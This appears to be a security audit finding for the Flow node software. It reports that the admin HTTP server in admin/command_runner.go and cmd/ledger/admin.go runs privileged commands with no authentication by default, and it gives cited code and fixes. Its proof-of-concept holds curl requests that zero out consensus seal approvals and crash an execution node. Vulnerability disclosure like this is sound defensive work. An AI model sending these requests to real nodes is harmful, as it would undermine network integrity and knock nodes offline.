### Title
Unauthenticated Admin HTTP Server Allows Any Network Peer to Execute Privileged Node Commands - (`admin/command_runner.go`)

### Summary

The Flow node admin HTTP server exposes privileged operational commands (including consensus parameter mutation and node halting) over an HTTP endpoint with **no authentication by default**. TLS/mTLS is entirely optional and only applied when the operator explicitly provides cert/key/CA files. When the admin server is bound to a non-loopback address — a supported and documented configuration — any network-reachable client can invoke commands such as `set-config` (to zero out `consensus-required-approvals-for-sealing`), `stop-at-height` (to crash an execution node), or `ingest-tx-rate-limit` (to manipulate collection node mempool rate limits), with no credential check whatsoever.

### Finding Description

`CommandRunner.runAdminServer()` starts two servers: a gRPC server on a Unix socket and an HTTP/gRPC-gateway server on `r.httpAddress`.

The gRPC server is created with no authentication interceptors:

```go
opts := []grpc.ServerOption{
    grpc.MaxRecvMsgSize(r.maxMsgSize),
    grpc.MaxSendMsgSize(r.maxMsgSize),
}
grpcServer := grpc.NewServer(opts...)
```

The HTTP server is created with no authentication middleware:

```go
httpServer := &http.Server{
    Addr:      r.httpAddress,
    Handler:   mux,
    TLSConfig: r.tlsConfig,
}
```

`r.tlsConfig` is `nil` unless `WithTLS(config)` is passed as an option. In `EnqueueAdminServerInit()`, TLS is only applied when all three of `AdminCert`, `AdminKey`, and `AdminClientCAs` are set:

```go
if node.AdminCert != NotSet {
    // ... load certs ...
    opts = append(opts, admin.WithTLS(config))
}
```

If those flags are absent (the default), `ListenAndServe()` is called instead of `ListenAndServeTLS()`, and the HTTP server accepts any unauthenticated request. The `runCommand()` function dispatches directly to the registered handler with no caller identity check:

```go
func (r *CommandRunner) runCommand(ctx context.Context, command string, data any) (any, error) {
    req := &CommandRequest{Data: data}
    if validator := r.getValidator(command); validator != nil {
        // only validates input shape, never caller identity
        ...
    }
    if handler := r.getHandler(command); handler != nil {
        handleResult, handleErr = handler(ctx, req)
    }
    ...
}
```

The registered default commands include:

- `set-config` → `SetConfigCommand.Handler` — can set `consensus-required-approvals-for-sealing` to `0`
- `stop-at-height` → `StopAtHeightCommand.Handler` — crashes/stops an execution node at a chosen block height
- `trigger-checkpoint` → `TriggerCheckpointCommand.Handler` — triggers WAL checkpoint
- `set-uploader-enabled` → `ToggleUploaderCommand.Handler` — disables block data upload
- `ingest-tx-rate-limit` — manipulates collection node mempool rate limits

The admin server bind address is operator-configured via `--admin-addr`. The README and localnet configuration explicitly document binding to `0.0.0.0:9002`, which exposes the endpoint to any network peer.

A separate, simpler admin HTTP server in `cmd/ledger/admin.go` (for the standalone ledger service) has **no TLS option at all** and exposes `trigger-checkpoint` to anyone who can reach the configured `--admin-addr` (documented as `0.0.0.0:9003`).

### Impact Explanation

An attacker who can reach the admin HTTP port (e.g., on a misconfigured or cloud-hosted node, or from within the same network segment) can:

1. **Disable seal verification**: `set-config` with `{"consensus-required-approvals-for-sealing": 0}` removes the requirement for verification node approvals before a seal is accepted by consensus nodes. This is a critical integrity failure — invalid execution results can be sealed without any verification.
2. **Halt execution nodes**: `stop-at-height` with `{"height": N, "crash": true}` crashes the execution node before it processes block N, causing a targeted denial of execution for specific blocks.
3. **Suppress block data upload**: `set-uploader-enabled` with `false` silently disables the block data uploader, causing data loss for downstream consumers.
4. **Manipulate collection node mempool**: `ingest-tx-rate-limit` can add arbitrary addresses to the rate-limit list, selectively blocking legitimate users from submitting transactions.

Impact (1) is the most severe: it directly undermines the consensus/verification trust model of the Flow protocol.

### Likelihood Explanation

The admin server is an intentional, documented feature. The README shows `curl localhost:9002/admin/run_command` as the standard usage pattern, and localnet maps port 9002 to `0.0.0.0`. Cloud deployments or misconfigured firewalls that expose port 9002 externally are realistic. TLS is opt-in and requires explicit operator action; the default path has zero authentication. Any attacker with TCP access to the admin port — including co-tenants in a shared cloud environment, peers on the same VPC, or external attackers against misconfigured nodes — can exploit this.

### Recommendation

1. **Enforce authentication by default**: Require mTLS or at minimum a shared secret/token for all admin HTTP requests. Authentication should be opt-out (with a warning), not opt-in.
2. **Bind to loopback by default**: Default `--admin-addr` to `127.0.0.1:9002` instead of accepting arbitrary bind addresses without warning.
3. **Add an authentication middleware layer**: Insert an HTTP middleware in `runAdminServer()` that rejects unauthenticated requests before they reach `runCommand()`, regardless of TLS configuration.
4. **Apply the same fix to `cmd/ledger/admin.go`**: The ledger service admin handler has no TLS option at all; add token-based or mTLS authentication.

### Proof of Concept

With a node running with `--admin-addr 0.0.0.0:9002` and no TLS flags set:

```bash
# Zero out consensus seal approval requirement — no credentials needed
curl -s http://<node-ip>:9002/admin/run_command \
  -H 'Content-Type: application/json' \
  -d '{"commandName": "set-config", "data": {"consensus-required-approvals-for-sealing": 0}}'
# Response: {"output":{"newValue":0,"oldValue":1}}

# Crash the execution node before block 9999999
curl -s http://<node-ip>:9002/admin/run_command \
  -H 'Content-Type: application/json' \
  -d '{"commandName": "stop-at-height", "data": {"height": 9999999, "crash": true}}'
# Response: {"output":"ok"}
```

No authentication token, certificate, or session is required. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5) [7](#0-6) [8](#0-7)

### Citations

**File:** admin/command_runner.go (L209-215)
```go
	opts := []grpc.ServerOption{
		grpc.MaxRecvMsgSize(r.maxMsgSize),
		grpc.MaxSendMsgSize(r.maxMsgSize),
	}

	grpcServer := grpc.NewServer(opts...)
	pb.RegisterAdminServer(grpcServer, NewAdminServer(r))
```

**File:** admin/command_runner.go (L249-253)
```go
	httpServer := &http.Server{
		Addr:      r.httpAddress,
		Handler:   mux,
		TLSConfig: r.tlsConfig,
	}
```

**File:** admin/command_runner.go (L304-341)
```go
func (r *CommandRunner) runCommand(ctx context.Context, command string, data any) (any, error) {
	r.logger.Info().Str("command", command).Msg("received new command")

	req := &CommandRequest{Data: data}

	if validator := r.getValidator(command); validator != nil {
		if validationErr := validator(req); validationErr != nil {
			// for expected validation errors, return code InvalidArgument and the error text
			if IsInvalidAdminParameterError(validationErr) {
				return nil, status.Error(codes.InvalidArgument, validationErr.Error())
			}
			// for unexpected errors, return code Internal and log a warning
			r.logger.Err(validationErr).Msg("unexpected error validating admin request")
			return nil, status.Error(codes.Internal, validationErr.Error())
		}
	}

	var handleResult any
	var handleErr error

	if handler := r.getHandler(command); handler != nil {
		if handleResult, handleErr = handler(ctx, req); handleErr != nil {
			if errors.Is(handleErr, context.Canceled) {
				return nil, status.Error(codes.Canceled, "client canceled")
			} else if errors.Is(handleErr, context.DeadlineExceeded) {
				return nil, status.Error(codes.DeadlineExceeded, "request timed out")
			} else {
				r.logger.Err(handleErr).Msg("unexpected error handling admin request")
				s, _ := status.FromError(handleErr)
				return nil, s.Err()
			}
		}
	} else {
		return nil, status.Error(codes.Unimplemented, "invalid command")
	}

	return handleResult, nil
}
```

**File:** cmd/scaffold.go (L756-775)
```go
		if node.AdminCert != NotSet {
			serverCert, err := tls.LoadX509KeyPair(node.AdminCert, node.AdminKey)
			if err != nil {
				return nil, err
			}
			clientCAs, err := os.ReadFile(node.AdminClientCAs)
			if err != nil {
				return nil, err
			}
			certPool := x509.NewCertPool()
			certPool.AppendCertsFromPEM(clientCAs)
			config := &tls.Config{
				MinVersion:   tls.VersionTLS13,
				Certificates: []tls.Certificate{serverCert},
				ClientAuth:   tls.RequireAndVerifyClientCert,
				ClientCAs:    certPool,
			}

			opts = append(opts, admin.WithTLS(config))
		}
```

**File:** admin/commands/common/set_config.go (L33-51)
```go
func (s *SetConfigCommand) Handler(_ context.Context, req *admin.CommandRequest) (any, error) {
	validatedReq := req.ValidatorData.(validatedSetConfigData)

	oldValue := validatedReq.field.Get()

	err := validatedReq.field.Set(validatedReq.value)
	if err != nil {
		if updatable_configs.IsValidationError(err) {
			return nil, fmt.Errorf("config update failed due to invalid input: %w", err)
		}
		return nil, fmt.Errorf("unexpected error setting config field %s: %w", validatedReq.field.Name, err)
	}

	res := map[string]any{
		"oldValue": oldValue,
		"newValue": validatedReq.value,
	}

	return res, nil
```

**File:** admin/commands/execution/stop_at_height.go (L36-57)
```go
func (s *StopAtHeightCommand) Handler(_ context.Context, req *admin.CommandRequest) (any, error) {
	sah := req.ValidatorData.(StopAtHeightReq)

	oldParams := s.stopControl.GetStopParameters()
	newParams := stop.StopParameters{
		StopBeforeHeight: sah.height,
		ShouldCrash:      sah.crash,
	}

	err := s.stopControl.SetStopParameters(newParams)

	if err != nil {
		return nil, err
	}

	log.Info().
		Interface("newParams", newParams).
		Interface("oldParams", oldParams).
		Msgf("admintool: New En stop parameters set")

	return "ok", nil
}
```

**File:** cmd/ledger/admin.go (L48-87)
```go
func (h *adminHandler) handleCommand(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if r.Method != http.MethodPost {
		h.writeError(w, http.StatusMethodNotAllowed, "method not allowed, use POST")
		return
	}

	var req adminRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		h.writeError(w, http.StatusBadRequest, fmt.Sprintf("invalid JSON: %v", err))
		return
	}

	h.logger.Info().Str("command", req.CommandName).Msg("received admin command")

	var result any

	switch req.CommandName {
	case "ping":
		result = "pong"

	case "list-commands":
		result = h.commands

	case "trigger-checkpoint":
		if h.triggerCheckpoint.CompareAndSwap(false, true) {
			h.logger.Info().Msg("trigger checkpoint as soon as finishing writing the current segment file")
			result = "ok"
		} else {
			result = "checkpoint already triggered"
		}

	default:
		h.writeError(w, http.StatusBadRequest, fmt.Sprintf("unknown command: %s", req.CommandName))
		return
	}

	h.writeSuccess(w, result)
}
```

**File:** admin/README.md (L75-97)
```markdown
### To set a config value
#### Example: require 1 approval for consensus sealing
```
curl localhost:9002/admin/run_command -H 'Content-Type: application/json' -d '{"commandName": "set-config", "data": {"consensus-required-approvals-for-sealing": 1}}'
```
TODO remove
#### Example: set block rate delay to 750ms
```
curl localhost:9002/admin/run_command -H 'Content-Type: application/json' -d '{"commandName": "set-config", "data": {"hotstuff-block-rate-delay": "750ms"}}'
```
#### Example: enable the auto-profiler
```
curl localhost:9002/admin/run_command -H 'Content-Type: application/json' -d '{"commandName": "set-config", "data": {"profiler-enabled": true}}'
```
#### Example: manually trigger the auto-profiler for 1 minute
```
curl localhost:9002/admin/run_command -H 'Content-Type: application/json' -d '{"commandName": "set-config", "data": {"profiler-trigger": "1m"}}'
```

### Set a stop height
```
curl localhost:9002/admin/run_command -H 'Content-Type: application/json' -d '{"commandName": "stop-at-height", "data": { "height": 1111, "crash": false }}'
```
```
